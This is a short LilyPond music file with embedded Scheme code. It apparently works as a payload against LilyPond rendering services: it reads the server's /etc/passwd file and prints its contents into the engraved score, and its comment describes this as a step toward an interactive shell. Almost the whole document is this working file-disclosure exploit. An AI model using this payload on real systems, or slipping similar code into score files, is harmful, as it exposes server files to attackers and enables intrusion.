% combines shell execution with file reading
% to get something like an interactive shell
#(define s "")
#(let*  ((f (open-input-file "/etc/passwd"))
        (c #\space))
  (while (not (eof-object? c))
  (set! s (string-append s (string c)))
  (set! c (read-char f))))

\score {
c^#s
}
\layout {}
